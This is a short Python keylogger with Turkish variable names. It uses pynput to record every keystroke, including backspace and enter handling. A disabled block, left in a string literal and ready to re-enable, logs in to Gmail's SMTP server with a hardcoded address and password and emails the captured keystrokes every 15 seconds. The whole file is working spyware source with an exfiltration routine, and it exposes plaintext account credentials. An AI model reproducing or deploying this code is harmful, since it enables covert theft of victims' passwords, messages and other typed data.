import pynput.keyboard
import smtplib
import threading

print("Keylogger Başlatılıyor . . .")

toplama = ""

def emir(harfler):
	global toplama
	print("=================================")
	try:
		toplama += str(harfler.char)
	except AttributeError:
		if harfler == harfler.space:
			toplama += " "
		
		elif harfler == harfler.backspace:
			sayi = len(toplama)
			sayi -= 1
			deger = 0
			sonuc = ""
			
			while sayi > deger:
				 sonuc += toplama[deger]
				 deger += 1
			toplama = sonuc
		
		elif harfler == harfler.enter:
			toplama += "\n"
		
		else:
			toplama += str(harfler)
		
	print(toplama)
"""
def mail_gonder(mesaj):
	global toplama
	server = smtplib.SMTP("smtp.gmail.com:587")
	server.starttls()
	server.login("socialmediasinan01@gmail.com", "Sosyal_Medya01")
	server.sendmail("socialmediasinan01@gmail.com", "socialmediasinan01@gmail.com", mesaj)
	server.quit()
	
def dallanma():
	global toplama
	mail_gonder(toplama)
	toplama = ""
	timer = threading.Timer(15, dallanma)
	timer.start()
"""
		
dinleme = pynput.keyboard.Listener(on_press=emir)

with dinleme:
	#dallanma()
	dinleme.join()

